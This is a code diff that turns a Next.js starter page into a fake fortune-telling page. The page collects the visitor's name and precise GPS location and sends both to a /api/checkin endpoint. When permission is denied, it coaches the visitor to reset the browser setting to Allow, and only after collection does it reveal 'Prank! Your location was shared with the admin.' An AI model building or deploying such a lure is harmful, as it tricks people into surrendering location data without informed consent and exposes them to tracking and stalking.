@@ -1,69 +1,251 @@
-import Image from "next/image";
+
+'use client';
+
+import { useCallback, useState } from 'react';
+
+type Stage = 'idle' | 'scanning' | 'revealed';
+type Problem = 'denied' | 'unavailable' | 'timeout' | 'error' | null;
 
 export default function Home() {
+  const [name, setName] = useState('');
+  const [stage, setStage] = useState<Stage>('idle');
+  const [problem, setProblem] = useState<Problem>(null);
+  const [imgOk, setImgOk] = useState(true);
+
+  const reveal = useCallback(() => {
+    setProblem(null);
+
+    if (!navigator.geolocation) {
+      setProblem('unavailable');
+      return;
+    }
+
+    setStage('scanning');
+
+    navigator.geolocation.getCurrentPosition(
+      async ({ coords }) => {
+        try {
+          const res = await fetch('/api/checkin', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              name,
+              lat: coords.latitude,
+              lng: coords.longitude,
+              accuracy: coords.accuracy,
+            }),
+          });
+
+          if (!res.ok) throw new Error('Save failed');
+
+          setTimeout(() => setStage('revealed'), 1800);
+        } catch {
+          setStage('idle');
+          setProblem('error');
+        }
+      },
+
+      (err) => {
+        setStage('idle');
+
+        if (err.code === err.PERMISSION_DENIED) {
+          setProblem('denied');
+        } else if (err.code === err.POSITION_UNAVAILABLE) {
+          setProblem('unavailable');
+        } else if (err.code === err.TIMEOUT) {
+          setProblem('timeout');
+        } else {
+          setProblem('error');
+        }
+      },
+
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0,
+      }
+    );
+  }, [name]);
+
   return (
-    <div className="flex flex-col flex-1 items-center justify-center bg-zinc-50 font-sans dark:bg-black">
-      <main className="flex flex-1 w-full max-w-3xl flex-col items-center justify-between py-32 px-16 bg-white dark:bg-black sm:items-start">
-        <Image
-          className="dark:invert h-5 w-[100px]"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className="flex flex-col items-center gap-6 text-center sm:items-start sm:text-left">
-          <h1 className="max-w-xs text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50">
-            To get started, edit the{" "}
-            <code className="rounded bg-black/[.06] px-1.5 py-0.5 font-mono text-[0.9em] dark:bg-white/[.08]">
-              page.tsx
-            </code>{" "}
-            file.
-          </h1>
-          <p className="max-w-md text-lg leading-8 text-zinc-600 dark:text-zinc-400">
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Learning
-            </a>{" "}
-            center.
-          </p>
-        </div>
-        <div className="flex flex-col gap-4 text-base font-medium sm:flex-row">
-          <a
-            className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] md:w-[158px]"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert h-[14px] w-4"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={14}
+    <main className="stage">
+      <div className="orb orb-a" />
+      <div className="orb orb-b" />
+
+      <section className="card">
+
+        {/* INITIAL SCREEN */}
+        {stage === 'idle' && (
+          <>
+            <div className="crystal">🔮</div>
+
+            <h1>Know Your Fortune</h1>
+
+            <p className="sub">
+              The stars are ready to speak. Are you?
+            </p>
+
+            <input
+              className="input"
+              value={name}
+              onChange={(e) => setName(e.target.value)}
+              placeholder="Enter your name"
+              maxLength={50}
             />
-            Deploy Now
-          </a>
-          <a
-            className="flex h-12 w-full items-center justify-center rounded-full border border-solid border-black/[.08] px-5 transition-colors hover:border-transparent hover:bg-black/[.04] dark:border-white/[.145] dark:hover:bg-[#1a1a1a] md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+
+            <button className="btn" onClick={reveal}>
+              Reveal my future
+            </button>
+          </>
+        )}
+
+        {/* SCANNING SCREEN */}
+        {stage === 'scanning' && (
+          <>
+            <div className="radar">
+              <span />
+              <span />
+              <span />
+
+              <div className="crystal small">🔮</div>
+            </div>
+
+            <h1>Reading the stars…</h1>
+
+            <p className="sub">
+              Please hold still
+            </p>
+          </>
+        )}
+
+        {/* REVEALED SCREEN */}
+        {stage === 'revealed' && (
+          <div className="reveal">
+            <div className="flowers">
+              {imgOk ? (
+                // eslint-disable-next-line @next/next/no-img-element
+                <img
+                  src="/flowers.jpg"
+                  alt="Flowers"
+                  onError={() => setImgOk(false)}
+                />
+              ) : (
+                <div className="emoji-flowers">
+                  🥀🌹🥀
+                </div>
+              )}
+            </div>
+
+            <h1 className="dark-text">
+              Your future is dark.
+            </h1>
+
+            <p className="tiny">
+              😄 Prank! Your location was shared with the admin.
+            </p>
+          </div>
+        )}
+      </section>
+
+      {/* LOCATION PERMISSION MODAL */}
+      {problem && (
+        <div className="overlay">
+          <div
+            className="modal"
+            role="dialog"
+            aria-modal="true"
           >
-            Documentation
-          </a>
+            {problem === 'denied' ? (
+              <>
+                <div className="modal-icon">🔒</div>
+
+                <h2>Location access required</h2>
+
+                <p className="modal-text">
+                  Your browser has blocked location access.
+                  Enable it to reveal your fortune.
+                </p>
+
+                <div className="permission-help">
+                  <div className="help-title">
+                    Quick instructions
+                  </div>
+
+                  <ol className="modal-steps">
+                    <li>
+                      Click the settings icon next to
+                      your website address.
+                    </li>
+
+                    <li>
+                      Find Location and click
+                      Reset permission or change it to Allow.
+                    </li>
+
+                    <li>
+                      Return here and click Continue.
+                    </li>
+                  </ol>
+                </div>
+
+                <div className="modal-actions">
+                  <button
+                    className="btn"
+                    onClick={reveal}
+                  >
+                    Continue →
+                  </button>
+                </div>
+
+                <p className="tiny">
+                  Reset the blocked permission before continuing.
+                </p>
+              </>
+            ) : (
+              <>
+                <div className="modal-icon">
+                  {problem === 'timeout'
+                    ? '⏳'
+                    : problem === 'unavailable'
+                      ? '📡'
+                      : '⚠️'}
+                </div>
+
+                <h2>
+                  {problem === 'timeout'
+                    ? 'Location timed out'
+                    : problem === 'unavailable'
+                      ? "Can't detect your location"
+                      : 'Something went wrong'}
+                </h2>
+
+                <p className="modal-text">
+                  {problem === 'timeout'
+                    ? "We couldn't get your location in time. Please try again."
+                    : problem === 'unavailable'
+                      ? 'Please turn on Location services on your device and try again.'
+                      : 'We could not complete your request. Please try again.'}
+                </p>
+
+                <div className="modal-actions">
+                  <button className="btn" onClick={reveal}>
+                    Try again
+                  </button>
+
+                  <button
+                    className="btn-ghost"
+                    onClick={() => setProblem(null)}
+                  >
+                    Close
+                  </button>
+                </div>
+              </>
+            )}
+          </div>
         </div>
-      </main>
-    </div>
+      )}
+    </main>
   );
 }
